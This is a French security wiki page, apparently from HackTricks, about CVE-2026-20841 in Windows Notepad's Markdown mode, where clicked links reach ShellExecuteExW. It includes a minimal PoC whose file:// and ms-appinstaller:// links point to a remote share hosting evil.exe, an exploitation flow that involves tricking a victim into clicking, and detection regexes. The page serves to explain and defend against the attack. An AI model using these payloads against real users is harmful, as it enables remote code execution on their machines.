# Abuse de Protocol Handler / ShellExecute de Windows (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Les applications Windows qui rendent du Markdown ou du HTML peuvent transmettre les cibles sur lesquelles l’utilisateur clique à `ShellExecuteExW`. Comme ShellExecute distribue les URI schemes enregistrés et les associations de fichiers, un renderer doit utiliser une allowlist explicite au lieu de supposer que chaque lien est en HTTP(S). Le comportement de Notepad décrit ci-dessous concerne CVE-2026-20841 et ne doit pas être généralisé à tous les renderers.<sup>[[1]](#references)[[3]](#references)</sup>

## Surface de ShellExecuteExW dans le mode Markdown de Windows Notepad
- Notepad choisit le mode Markdown **uniquement pour les extensions `.md`** via une comparaison de chaînes fixe dans `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Liens Markdown pris en charge :
- Standard : `[text](target)`
- Autolink : `<target>` (rendu comme `[target](target)`), les deux syntaxes sont donc importantes pour les payloads et les détections.
- Les clics sur les liens sont traités dans `sub_140170F60()`, qui effectue un filtrage faible, puis appelle `ShellExecuteExW`.
- `ShellExecuteExW` distribue vers **n’importe quel protocol handler configuré**, et pas uniquement HTTP(S).<sup>[[1]](#references)</sup>

### Considérations relatives au payload
- Toutes les séquences `\\` présentes dans le lien sont **normalisées en `\`** avant l’appel à `ShellExecuteExW`, ce qui affecte la création de chemins/UNC et la détection.
- Les fichiers `.md` **ne sont pas associés à Notepad par défaut** ; la victime doit tout de même ouvrir le fichier dans Notepad et cliquer sur le lien, mais une fois rendu, le lien est cliquable.
- Exemples de schemes dangereux :<sup>[[1]](#references)</sup>
- `file://` pour lancer un payload local/UNC.
- `ms-appinstaller://` pour déclencher les flux App Installer. D’autres schemes enregistrés localement peuvent également être abusés.

### PoC Markdown minimal
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flux d’exploitation
1. Créez un **fichier `.md`** afin que Notepad l’affiche comme du Markdown.
2. Intégrez un lien utilisant un schéma URI dangereux (`file:`, `ms-appinstaller:` ou tout autre handler installé).
3. Transmettez le fichier (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similaire) et convainquez l’utilisateur de l’ouvrir dans Notepad.
4. Lors du clic, le **lien normalisé** est transmis à `ShellExecuteExW`, et le handler de protocole correspondant exécute le contenu référencé dans le contexte de l’utilisateur.<sup>[[1]](#references)[[2]](#references)</sup>

## Idées de détection
- Surveillez les transferts de fichiers `.md` via les ports/protocoles qui servent couramment à transmettre des documents : `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analysez les liens Markdown (standard et autolink) et recherchez `file:` ou `ms-appinstaller:` **sans tenir compte de la casse**.
- Expressions régulières recommandées par les fournisseurs pour détecter l’accès aux ressources distantes :
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Le correctif du fournisseur décrit par ZDI restreint les cibles acceptées aux fichiers locaux et à HTTP(S). Étendez les détections aux autres protocol handlers installés si nécessaire, car la surface d’attaque enregistrée varie selon le système.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841 : Exécution de code arbitraire dans le Bloc-notes Windows](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC de CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
